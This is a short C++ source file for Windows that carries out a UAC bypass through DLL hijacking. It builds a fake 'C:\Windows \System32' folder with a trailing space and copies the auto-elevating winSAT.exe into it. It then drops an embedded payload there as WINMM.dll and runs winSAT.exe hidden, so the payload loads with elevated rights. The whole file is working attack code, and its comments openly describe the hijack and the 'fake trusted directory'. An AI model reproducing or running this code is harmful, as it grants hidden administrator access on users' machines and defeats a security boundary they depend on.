#include "stdafx.h"
#include <Windows.h>
#include "resource.h"

void DropResource(const wchar_t* rsrcName, const wchar_t* filePath) {
	HMODULE hMod = GetModuleHandle(NULL);
	HRSRC res = FindResource(hMod, MAKEINTRESOURCE(IDR_DATA1), rsrcName);
	DWORD dllSize = SizeofResource(hMod, res);
	void* dllBuff = LoadResource(hMod, res);
	HANDLE hDll = CreateFile(filePath, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, NULL);
	DWORD sizeOut;
	WriteFile(hDll, dllBuff, dllSize, &sizeOut, NULL);
	CloseHandle(hDll);
}

int main()
{
	_SHELLEXECUTEINFOW se = {};
	//Create Mock SystemRoot Directory
	CreateDirectoryW(L"\\\\?\\C:\\Windows \\", 0);
	CreateDirectoryW(L"\\\\?\\C:\\Windows \\System32", 0);
	CopyFileW(L"C:\\Windows\\System32\\winSAT.exe", L"\\\\?\\C:\\Windows \\System32\\winSAT.exe", false);

	//Drop our dll for hijack
	DropResource(L"DATA", L"\\\\?\\C:\\Windows \\System32\\WINMM.dll");

	//Execute our winSAT.exe copy from fake trusted directory
	se.cbSize = sizeof(_SHELLEXECUTEINFOW);
	se.lpFile =  L"C:\\Windows \\System32\\winSAT.exe";
	se.lpParameters = L"formal";
	se.nShow = SW_HIDE;
	se.hwnd = NULL;
	se.lpDirectory = NULL;
	ShellExecuteEx(&se);

    	return 0;
}